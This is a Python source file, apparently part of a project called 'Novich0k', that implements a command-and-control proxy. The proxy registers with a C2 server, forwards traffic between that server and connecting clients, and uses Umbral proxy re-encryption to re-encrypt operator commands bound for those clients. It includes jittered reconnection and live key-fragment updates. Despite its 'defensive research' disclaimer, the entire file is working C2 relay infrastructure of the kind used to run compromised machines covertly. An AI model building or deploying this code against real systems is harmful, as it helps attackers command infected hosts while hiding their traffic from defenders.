#!/usr/bin/env python3
# Novich0k - Umbral PRE-Based C2 Proxy Implementation
# For defensive security research purposes only

import socket
import threading
import time
import json
import base64
import os
import sys
import argparse
import logging
import random

# Import Umbral PRE libraries - adapted for your installation
from umbral import SecretKey, PublicKey, Signer
from umbral.curve import SECP256K1
from umbral.pre import encrypt, decrypt_original, decrypt_reencrypted, reencrypt
from umbral import Capsule, CapsuleFrag, KeyFrag

# Import local modules if available
try:
    from modules.utils import get_timestamp, key_fingerprint, setup_environment, check_dependencies
except ImportError:
    # For standalone use
    pass

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("novich0k_proxy.log")
    ]
)

logger = logging.getLogger("Novich0k-Proxy")

class UmbralPRE:
    """Simplified wrapper for Umbral PRE operations"""
    
    def __init__(self):
        """Initialize Umbral parameters"""
        # Set default curve parameters - adjusted for umbral 0.3.0
        self.params = SECP256K1
    
    def generate_keys(self):
        """Generate a keypair for a participant - adapted for your installation"""
        # Generate private key
        private_key = SecretKey.random()
        
        # Generate corresponding public key
        public_key = private_key.public_key()
        
        # Generate signing keys
        signing_private_key = SecretKey.random()
        signing_public_key = signing_private_key.public_key()
        signer = Signer(signing_private_key)
        
        return {
            'private_key': private_key,
            'public_key': public_key,
            'signing_key': signing_private_key,
            'verifying_key': signing_public_key,
            'signer': signer
        }
    
    def serialize_key(self, key):
        """Serialize a key for transmission - adapted for Umbral 0.3.0"""
        try:
            return base64.b64encode(bytes(key)).decode()
        except Exception as e:
            logger.error(f"Error serializing key: {e}")
            raise ValueError(f"Error serializing key: {e}")
    
    def deserialize_private_key(self, key_bytes):
        """Deserialize a private key from bytes - adapted for Umbral 0.3.0"""
        try:
            decoded = base64.b64decode(key_bytes)
            return SecretKey.from_bytes(decoded)
        except Exception as e:
            logger.error(f"Error deserializing private key: {e}")
            raise ValueError("Invalid private key format")
    
    def deserialize_public_key(self, key_bytes):
        """Deserialize a public key from bytes - adapted for Umbral 0.3.0"""
        try:
            decoded = base64.b64decode(key_bytes)
            return PublicKey.from_bytes(decoded)
        except Exception as e:
            logger.error(f"Error deserializing public key: {e}")
            raise ValueError("Invalid public key format")
    
    def deserialize_kfrag(self, kfrag_bytes):
        """Deserialize a key fragment from bytes - adapted for Umbral 0.3.0"""
        try:
            decoded = base64.b64decode(kfrag_bytes)
            return KeyFrag.from_bytes(decoded)
        except Exception as e:
            logger.error(f"Error deserializing key fragment: {e}")
            raise ValueError("Invalid key fragment format")
    
    def deserialize_capsule(self, capsule_bytes):
        """Deserialize a capsule from bytes - adapted for Umbral 0.3.0"""
        try:
            decoded = base64.b64decode(capsule_bytes)
            return Capsule.from_bytes(decoded)
        except Exception as e:
            logger.error(f"Error deserializing capsule: {e}")
            raise ValueError("Invalid capsule format")


class ProxyServer:
    """Proxy server with Umbral PRE capabilities"""
    
    def __init__(self, listen_host='127.0.0.1', listen_port=8889,
                 server_host='127.0.0.1', server_port=8888):
        """Initialize the proxy server"""
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.server_host = server_host
        self.server_port = server_port
        self.proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.proxy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Client connections and mappings
        self.client_connections = {}  # client_id -> (client_socket, server_socket)
        self.socket_to_client = {}    # client_socket -> client_id
        
        # Initialize Umbral PRE
        self.pre = UmbralPRE()
        
        # Generate proxy keys
        self.keys = self.pre.generate_keys()
        
        # Storage for delegations from C2 server
        self.delegations = {}  # delegating_pk -> {kfrags, delegating_pk}
        
        # Registration status
        self.registered_with_c2 = False
        
        # C2 server connection
        self.c2_socket = None
        
        # Connection state
        self.running = True
        self.reconnect_delay = 5  # Base delay in seconds
        self.max_reconnect_delay = 60  # Maximum delay in seconds
        self.reconnect_attempts = 0
        self.max_reconnect_attempts = 0  # 0 = unlimited attempts
        
        logger.info(f"Proxy Server initialized to listen on {listen_host}:{listen_port}")
        logger.info(f"Will forward to C2 server at {server_host}:{server_port}")
    
    def start(self):
        """Start the proxy server"""
        try:
            # Bind to the listening port
            self.proxy_socket.bind((self.listen_host, self.listen_port))
            self.proxy_socket.listen(5)
            logger.info(f"Proxy listening on {self.listen_host}:{self.listen_port}")
            
            # Start connection maintenance thread
            maintenance_thread = threading.Thread(target=self.maintain_c2_connection)
            maintenance_thread.daemon = True
            maintenance_thread.start()
            
            # Register with the C2 server
            registration_thread = threading.Thread(target=self.register_with_c2)
            registration_thread.daemon = True
            registration_thread.start()
            
            # Main loop to accept client connections
            print(f"[*] Proxy server running on {self.listen_host}:{self.listen_port}")
            print(f"[*] Forwarding to C2 server at {self.server_host}:{self.server_port}")
            print("[*] Waiting for client connections...")
            
            while self.running:
                try:
                    # Set a timeout so we can check running flag periodically
                    self.proxy_socket.settimeout(1.0)
                    try:
                        client_socket, address = self.proxy_socket.accept()
                        logger.info(f"New connection from {address[0]}:{address[1]}")
                        print(f"[+] New connection from {address[0]}:{address[1]}")
                        
                        # Start a thread to handle this connection
                        client_thread = threading.Thread(
                            target=self.handle_connection,
                            args=(client_socket, address)
                        )
                        client_thread.daemon = True
                        client_thread.start()
                    except socket.timeout:
                        # This is expected due to the timeout
                        continue
                except Exception as e:
                    if self.running:  # Only log if not shutting down
                        logger.error(f"Error accepting client connection: {e}")
                        print(f"[!] Error accepting client connection: {e}")
                        time.sleep(1)  # Prevent tight error loop
                
        except KeyboardInterrupt:
            logger.info("Proxy server interrupted by user")
            print("\n[*] Shutting down proxy...")
            self.shutdown()
        except Exception as e:
            logger.error(f"Error in proxy server: {e}")
            print(f"[!] Error: {e}")
            self.shutdown()
    
    def shutdown(self):
        """Shutdown the proxy server gracefully"""
        self.running = False
        
        # Close all client connections
        for client_id, (client_socket, server_socket) in list(self.client_connections.items()):
            try:
                client_socket.close()
                server_socket.close()
            except:
                pass
        
        # Close the C2 server connection
        if self.c2_socket:
            try:
                self.c2_socket.close()
            except:
                pass
            self.c2_socket = None
        
        # Close the listening socket
        try:
            self.proxy_socket.close()
        except:
            pass
        
        logger.info("Proxy server shut down")
    
    def is_c2_connected(self):
        """Check if the C2 server connection is still active"""
        if not self.c2_socket:
            return False
        
        try:
            # Non-blocking way to check connection status
            self.c2_socket.getpeername()
            return True
        except:
            return False
    
    def maintain_c2_connection(self):
        """Keep the C2 server connection alive with automatic reconnection"""
        while self.running:
            try:
                if not self.is_c2_connected() and not self.registered_with_c2:
                    # Only log if we need to reconnect but aren't already trying
                    if self.reconnect_attempts == 0:
                        logger.info("C2 server connection lost, will attempt to reconnect")
                    
                    # Sleep before checking again to avoid tight loop
                    time.sleep(5)
                else:
                    # Connection is good, sleep longer
                    time.sleep(30)
                    
            except Exception as e:
                logger.error(f"Error in connection maintenance: {e}")
                time.sleep(5)
    
    def register_with_c2(self):
        """Register the proxy with the C2 server to get re-encryption keys"""
        self.reconnect_attempts = 0
        
        while self.running and not self.registered_with_c2:
            try:
                # Check if we're already at the maximum number of attempts
                if self.max_reconnect_attempts > 0 and self.reconnect_attempts >= self.max_reconnect_attempts:
                    logger.error(f"Max reconnection attempts ({self.max_reconnect_attempts}) reached. Giving up.")
                    print(f"[!] Failed to register with C2 server after {self.max_reconnect_attempts} attempts.")
                    # Continue running but don't try to register again
                    break
                
                # Increment attempt counter
                self.reconnect_attempts += 1
                
                # Apply exponential backoff with jitter
                if self.reconnect_attempts > 1:  # Skip delay on first attempt
                    jitter = random.uniform(0.8, 1.2)
                    current_delay = min(self.reconnect_delay * jitter, self.max_reconnect_delay)
                    
                    logger.info(f"Attempting to register with C2 server in {current_delay:.1f} seconds (attempt {self.reconnect_attempts})")
                    print(f"[*] Attempting to register with C2 server in {current_delay:.1f} seconds (attempt {self.reconnect_attempts})...")
                    
                    # Wait before attempting to reconnect
                    time.sleep(current_delay)
                
                logger.info(f"Attempting to register with C2 server (attempt {self.reconnect_attempts})")
                
                # Close any existing socket
                if self.c2_socket:
                    try:
                        self.c2_socket.close()
                    except:
                        pass
                    self.c2_socket = None
                
                # Connect to the C2 server
                self.c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.c2_socket.connect((self.server_host, self.server_port))
                
                # Send proxy's public key
                registration_data = {
                    'proxy_registration': True,
                    'public_key': self.pre.serialize_key(self.keys['public_key']),
                    'verifying_key': self.pre.serialize_key(self.keys['verifying_key'])
                }
                
                self.c2_socket.send(json.dumps(registration_data).encode())
                logger.info("Sent registration data to C2 server")
                
                # Receive C2's response with kfrags
                response = self.c2_socket.recv(8192)
                if not response:
                    logger.error("Empty response from C2 server during registration")
                    continue
                    
                response_data = json.loads(response.decode())
                
                if 'status' in response_data and response_data['status'] == 'registered':
                    # Store the delegation information
                    self.delegations[response_data['delegating_pk']] = {
                        'kfrags': response_data['kfrags'],
                        'delegating_pk': response_data['delegating_pk']
                    }
                    
                    self.registered_with_c2 = True
                    self.reconnect_attempts = 0  # Reset for future reconnections
                    self.reconnect_delay = 5  # Reset delay
                    
                    logger.info("Successfully registered with C2 server")
                    print("[+] Successfully registered with C2 server")
                    
                    # Keep connection for server updates
                    server_update_thread = threading.Thread(
                        target=self.listen_for_server_updates,
                        args=(self.c2_socket,)
                    )
                    server_update_thread.daemon = True
                    server_update_thread.start()
                    
                    return
                else:
                    logger.error("Failed to register with C2 server")
                    print(f"[!] Failed to register with C2 server: {response_data.get('error', 'Unknown error')}")
                    self.c2_socket.close()
                    self.c2_socket = None
                    
                    # Increase backoff delay for next attempt
                    self.reconnect_delay = min(self.reconnect_delay * 1.5, self.max_reconnect_delay)
            
            except Exception as e:
                logger.error(f"Error registering with C2 server: {e}")
                print(f"[!] Error registering with C2 server: {e}")
                if self.c2_socket:
                    try:
                        self.c2_socket.close()
                    except:
                        pass
                    self.c2_socket = None
                
                # Increase backoff delay for next attempt
                self.reconnect_delay = min(self.reconnect_delay * 1.5, self.max_reconnect_delay)
        
        if not self.registered_with_c2 and self.running:
            logger.warning("Proxy will run in forwarding-only mode (no re-encryption)")
            print("[!] Proxy will run in forwarding-only mode (no re-encryption)")
    
    def listen_for_server_updates(self, server_socket):
        """Listen for updates from the C2 server (new kfrags, etc.)"""
        try:
            while self.running:
                try:
                    # Set a timeout to periodically check the running state
                    server_socket.settimeout(10)
                    
                    try:
                        data = server_socket.recv(8192)
                        if not data:
                            logger.warning("Connection to C2 server closed")
                            print("[!] Connection to C2 server closed")
                            break
                        
                        update_data = json.loads(data.decode())
                        
                        # Handle key fragment updates
                        if 'update_kfrags' in update_data:
                            delegating_pk = update_data['delegating_pk']
                            new_kfrags = update_data['kfrags']
                            
                            self.delegations[delegating_pk] = {
                                'kfrags': new_kfrags,
                                'delegating_pk': delegating_pk
                            }
                            
                            logger.info(f"Updated kfrags for delegator: {delegating_pk[:10]}...")
                            print(f"[+] Updated key fragments from C2 server")
                    except socket.timeout:
                        # This is expected due to timeout
                        continue
                    
                except ConnectionResetError:
                    logger.warning("Connection reset by C2 server")
                    print("[!] Connection reset by C2 server")
                    break
                except socket.error as e:
                    logger.error(f"Socket error in server update listener: {e}")
                    break
        
        except Exception as e:
            logger.error(f"Error in server update listener: {e}")
            print(f"[!] Error in server communication: {e}")
        finally:
            try:
                server_socket.close()
            except:
                pass
                
            self.c2_socket = None
            self.registered_with_c2 = False
            
            if self.running:
                # Delay before trying to reconnect
                time.sleep(5)
                # Try to reconnect if the connection was lost
                logger.info("Re-initiating registration with C2 server")
                registration_thread = threading.Thread(target=self.register_with_c2)
                registration_thread.daemon = True
                registration_thread.start()
    
    def handle_connection(self, client_socket, client_address):
        """Handle a client connection to the proxy"""
        client_id = f"{client_address[0]}:{client_address[1]}"
        server_socket = None
        
        try:
            # First, receive initial data from the client
            initial_data = client_socket.recv(8192)
            if not initial_data:
                logger.warning(f"No data received from {client_id}")
                client_socket.close()
                return
            
            # Try to parse and log the initial data
            try:
                initial_message = json.loads(initial_data.decode())
                logger.info(f"Initial message from client {client_id}: {initial_message.keys()}")
            except:
                logger.warning(f"Initial message is not valid JSON. Length: {len(initial_data)}")
            
            # Connect to the C2 server
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((self.server_host, self.server_port))
            
            # Forward the initial data to the server
            server_socket.send(initial_data)
            
            # Store the connection mappings
            self.client_connections[client_id] = (client_socket, server_socket)
            self.socket_to_client[client_socket] = client_id
            
            # Wait for server's response to initial data
            initial_response = server_socket.recv(8192)
            if initial_response:
                # Forward this response back to the client
                client_socket.send(initial_response)
                
                # Try to parse and log the initial response
                try:
                    response_message = json.loads(initial_response.decode())
                    logger.info(f"Initial response to client {client_id}: {response_message.keys()}")
                except:
                    logger.warning(f"Initial response is not valid JSON. Length: {len(initial_response)}")
            
            # Now set up continuous forwarding threads
            c2s_thread = threading.Thread(
                target=self.forward_client_to_server,
                args=(client_socket, server_socket, client_id)
            )
            s2c_thread = threading.Thread(
                target=self.forward_server_to_client,
                args=(server_socket, client_socket, client_id)
            )
            
            c2s_thread.daemon = True
            s2c_thread.daemon = True
            
            c2s_thread.start()
            s2c_thread.start()
            
            # Wait for both threads to complete
            c2s_thread.join()
            s2c_thread.join()
            
        except Exception as e:
            logger.error(f"Error handling connection for {client_id}: {e}")
            print(f"[!] Error handling connection for {client_id}: {e}")
        finally:
            # Clean up the connection
            if client_id in self.client_connections:
                del self.client_connections[client_id]
            
            if client_socket in self.socket_to_client:
                del self.socket_to_client[client_socket]
            
            try:
                client_socket.close()
            except:
                pass
                
            if server_socket:
                try:
                    server_socket.close()
                except:
                    pass
                    
            logger.info(f"Connection closed for {client_id}")
    
    def forward_client_to_server(self, client_socket, server_socket, client_id):
        """Forward traffic from client to server"""
        try:
            while self.running:
                try:
                    # Set a timeout to detect disconnections
                    client_socket.settimeout(5)
                    
                    try:
                        # Receive data from client
                        data = client_socket.recv(8192)
                        if not data:
                            logger.info(f"Client {client_id} disconnected")
                            break
                        
                        # We don't need to modify client->server traffic
                        # Just forward it as-is
                        server_socket.send(data)
                    except socket.timeout:
                        # No data received in timeout period, check if connection is still active
                        continue
                    
                except ConnectionResetError:
                    logger.error(f"Connection reset while forwarding client->server for {client_id}")
                    break
                except socket.error as e:
                    logger.error(f"Socket error forwarding client->server for {client_id}: {e}")
                    break
                
        except Exception as e:
            logger.error(f"Error forwarding client->server for {client_id}: {e}")
        finally:
            logger.info(f"Client->server forwarding ended for {client_id}")
    
    def forward_server_to_client(self, server_socket, client_socket, client_id):
        """Forward traffic from server to client with re-encryption when applicable"""
        try:
            while self.running:
                try:
                    # Set a timeout to detect disconnections
                    server_socket.settimeout(5)
                    
                    try:
                        # Receive data from server
                        data = server_socket.recv(8192)
                        if not data:
                            logger.info(f"Server disconnected from {client_id}")
                            break
                        
                        try:
                            # Try to parse as JSON
                            message = json.loads(data.decode())
                            
                            # Check if this is a command that needs re-encryption
                            if 'command' in message and message.get('command') and self.registered_with_c2:
                                if message.get('use_proxy', False) and 'encrypted_data' in message:
                                    # This command is flagged for re-encryption
                                    logger.info(f"Re-encrypting command for {client_id}")
                                    modified_message = self.reencrypt_command(message)
                                    
                                    if modified_message:
                                        # Send the re-encrypted command
                                        client_socket.send(json.dumps(modified_message).encode())
                                        continue
                            
                            # For all other cases, forward unchanged
                            client_socket.send(data)
                            
                        except json.JSONDecodeError:
                            # Not JSON, forward unchanged
                            client_socket.send(data)
                        except Exception as e:
                            logger.error(f"Error processing message: {e}")
                            # Forward unchanged on error
                            client_socket.send(data)
                    except socket.timeout:
                        # No data received in timeout period, check if connection is still active
                        continue
                    
                except ConnectionResetError:
                    logger.error(f"Connection reset while forwarding server->client for {client_id}")
                    break
                except socket.error as e:
                    logger.error(f"Socket error forwarding server->client for {client_id}: {e}")
                    break
                
        except Exception as e:
            logger.error(f"Error forwarding server->client for {client_id}: {e}")
        finally:
            logger.info(f"Server->client forwarding ended for {client_id}")
    
    def reencrypt_command(self, message):
        """Re-encrypt a command from the server to the client - adapted for Umbral 0.3.0"""
        try:
            # Extract the encrypted data
            encrypted_data = message['encrypted_data']
            delegating_pk = message.get('delegating_pk')
            
            if not delegating_pk and 'delegating_pk' in encrypted_data:
                # Try to get the delegating key from the encrypted data if not in the main message
                delegating_pk = encrypted_data['delegating_pk']
            
            if not delegating_pk:
                # If still not found, try to use any key we have delegations for
                if self.delegations:
                    delegating_pk = list(self.delegations.keys())[0]
                else:
                    logger.error("No delegation key found for re-encryption")
                    return None
            
            if delegating_pk not in self.delegations:
                logger.error("No delegation found for the specified public key")
                return None
            
            delegation = self.delegations[delegating_pk]
            
            try:
                # Deserialize the capsule for Umbral 0.3.0
                capsule_bytes = base64.b64decode(encrypted_data['capsule'])
                capsule = Capsule.from_bytes(capsule_bytes)
                
                # Get key fragments for this delegator
                kfrags = []
                for kf in delegation['kfrags']:
                    try:
                        kfrag = self.pre.deserialize_kfrag(kf)
                        kfrags.append(kfrag)
                    except Exception as e:
                        logger.error(f"Error deserializing kfrag: {e}")
                        continue
                
                if not kfrags:
                    logger.error("No valid key fragments available")
                    return None
                
                # Determine threshold (or use default)
                threshold = message.get('threshold', len(kfrags) // 2 + 1)
                threshold = min(threshold, len(kfrags))
                
                # Choose a random subset of kfrags to use
                chosen_kfrags = random.sample(kfrags, threshold)
                
                # Generate capsule fragments by re-encrypting - adapted for Umbral 0.3.0
                cfrags = []
                for kfrag in chosen_kfrags:
                    try:
                        cfrag = reencrypt(capsule=capsule, kfrag=kfrag)
                        # Use bytes() directly for Umbral 0.3.0
                        cfrags.append(base64.b64encode(bytes(cfrag)).decode())
                    except Exception as e:
                        logger.error(f"Error generating capsule fragment: {e}")
                        continue
                
                if not cfrags:
                    logger.error("Failed to generate any valid capsule fragments")
                    return None
                
                # Create the re-encrypted package - using original serialized capsule
                proxy_package = {
                    'ciphertext': encrypted_data['ciphertext'],
                    'capsule': encrypted_data['capsule'],  # Use the original serialized capsule
                    'cfrags': cfrags,
                    'delegating_pk': delegating_pk,
                    're_encrypted': True,
                    'threshold': threshold
                }
                
                # Create the final message
                return {
                    'command': True,
                    'proxy_package': proxy_package
                }
            except Exception as e:
                logger.error(f"Error during re-encryption: {e}")
                return None
            
        except Exception as e:
            logger.error(f"Error re-encrypting command: {e}")
            return None


def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="Novich0k - Umbral PRE-Based C2 Proxy")
    parser.add_argument("--host", default="127.0.0.1",
                        help="Host to bind the proxy to")
    parser.add_argument("--port", type=int, default=8889,
                        help="Port to bind the proxy to")
    parser.add_argument("--server-host", default="127.0.0.1",
                        help="C2 server host to connect to")
    parser.add_argument("--server-port", type=int, default=8888,
                        help="C2 server port to connect to")
    parser.add_argument("--setup", action="store_true",
                        help="Install required dependencies")
    parser.add_argument("--debug", action="store_true",
                        help="Enable debug logging")
    parser.add_argument("--max-reconnect", type=int, default=0,
                        help="Maximum reconnection attempts to C2 server (0 = unlimited)")
    
    args = parser.parse_args()
    
    # Set debug logging if requested
    if args.debug:
        logger.setLevel(logging.DEBUG)
        logger.debug("Debug logging enabled")
    
    if args.setup:
        try:
            from modules.utils import setup_environment
            if setup_environment():
                print("[+] Setup complete")
            else:
                print("[!] Setup failed")
            return
        except ImportError:
            print("[!] Setup module not found")
            return
    
    # Check dependencies
    try:
        from modules.utils import check_dependencies
        missing = check_dependencies()
        if missing:
            print(f"[!] Missing dependencies: {', '.join(missing)}")
            print("[*] Install dependencies with: python umbral_proxy.py --setup")
            return
    except Exception as e:
        logger.warning(f"Could not check dependencies: {e}")
    
    try:
        proxy = ProxyServer(
            listen_host=args.host,
            listen_port=args.port,
            server_host=args.server_host,
            server_port=args.server_port
        )
        
        # Set max reconnection attempts
        proxy.max_reconnect_attempts = args.max_reconnect
        
        proxy.start()
    except KeyboardInterrupt:
        print("\n[*] Proxy interrupted by user. Exiting...")
    except Exception as e:
        print(f"[!] Error: {e}")


if __name__ == "__main__":
    main()